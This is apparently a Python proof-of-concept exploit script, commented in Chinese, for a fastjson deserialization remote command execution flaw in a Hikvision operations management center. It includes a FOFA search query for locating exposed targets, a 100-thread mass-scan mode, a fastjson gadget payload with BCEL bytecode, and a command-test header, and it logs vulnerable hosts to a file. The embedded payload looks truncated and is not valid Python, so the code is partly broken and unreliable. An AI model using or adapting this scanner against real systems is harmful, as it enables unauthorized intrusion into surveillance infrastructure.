#海康威视运行管理中心远程命令执行漏洞(fastjson)
#fofa:header="X-Content-Type-Options: nosniff" && body="<h1>Welcome to OpenResty!</h1>" && header="X-Xss-Protection: 1; mode=block"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

███████╗ █████╗ ███████╗████████╗  ██╗███████╗ ██████╗ ███╗   ██╗
██╔════╝██╔══██╗██╔════╝╚══██╔══╝  ██║██╔════╝██╔═══██╗████╗  ██║
█████╗  ███████║███████╗   ██║     ██║███████╗██║   ██║██╔██╗ ██║
██╔══╝  ██╔══██║╚════██║   ██║██   ██║╚════██║██║   ██║██║╚██╗██║
██║     ██║  ██║███████║   ██║╚█████╔╝███████║╚██████╔╝██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                                                                                                                                                                                 
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="海康威视运行管理中心远程命令执行漏洞(fastjson)")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/center/api/session"
    headers = {
        'Accept':'application/json,text/plain,*/*',
        'Accept-Encoding':'gzip,deflate',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Type':'application/json;charset=UTF-8',
        'X-Language-Type':'zh_CN',
        'Testcmd':'echo mt',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX-1_0_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/78.0.3904.108Safari/537.36',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Content-Length':'5778',
        
    }
    data = {"x":{{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90"}}:"a"}}
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,json=data,verify=False,proxies=proxies)
        if res1.status_code==200 and 'mt' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()